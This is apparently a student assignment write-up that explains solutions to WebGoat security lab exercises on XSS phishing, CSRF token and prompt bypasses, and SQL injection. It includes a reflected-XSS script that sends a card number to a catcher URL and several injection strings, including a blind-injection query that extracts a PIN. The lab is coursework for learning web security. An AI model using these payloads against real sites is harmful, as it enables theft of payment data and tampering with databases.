#Zhenyi Tang, 1007177840, zhenyi.tang@mail.utoronto.ca
#Hongbo Zhu, 1006893792, hongbo.zhu@mail.utoronto.ca

part 1 Explanation:
Phishing with XSS
A form was used to collect user's information. When the user click the button, post the info to target URL.

part 2 Explanation:
Reflected XSS Attacks
The three digit access code input is exploitable.
Readable version of the URL
http://localhost:8090/WebGoat/start.mvc#attack/752417971/900?input1=000&input2=

<script>
    var btn = document.getElementsByName("buy")[0];
    btn.addEventListener('click', function () { steal(); }, false);
    function steal() {
        $.ajax({ type: "POST", url: "catcher?PROPERTY=yes&stolen-credit-card=" + document.getElementsByName("input1")[0].value, });
    }
    document.getElementsByName("input2")[0].value = "000";
    document.getElementById("message").style.display = "none";
</script>
Explanation: Add an event listener to the Purchase button. When the user click the button, post the credit card number to target URL. Using DOM operation to change the input2 value so that we can make the page with the injected script looks as close as the original page

part 3 Explanation:
Cross Site Request Forgery (CSRF)
The message is exploitable. We can put the url inside an image element.

Part 4 Explanation:
CSRF Prompt By-Pass
Using two iframe element to fetch the target url. The first frame uses to start the transfer and the second frame uses to confirm the transfer.

Part 5 Explanation:
CSRF Token By-Pass
The message is exploitable. We can use a frame to get the token first and then use another frame to start the transfer with the token.

Part 6 Explanation:
inject a SQL statement into the input field where we should give only a value. the SQL statement is smith' or 1=1 --, the 1=1 is always true so the database will return every row.

Part 7 Explanation:
At the first part, inject a SQL statement into the input field, use the update SQL statement to update the salary where the userid is 101 to 555000. 
At the second part, the injected SQL statement will create a trigger that will change the every new data's email to ece568-2020f@utoronto.ca.

Part 8 Explanation:
The program will determine whether the value we input is valid or not. But instead giving a single value. we can input a value plus a SQl statement. Since we know the value is valid, we can use it to determine if this SQL statement is true. The statement is "101 AND (select pin from credit where cc_number = 1234123412341234) = 3318". We can select the pin value where cc_number is 1234123412341234 and use > < and = to determine it's value.
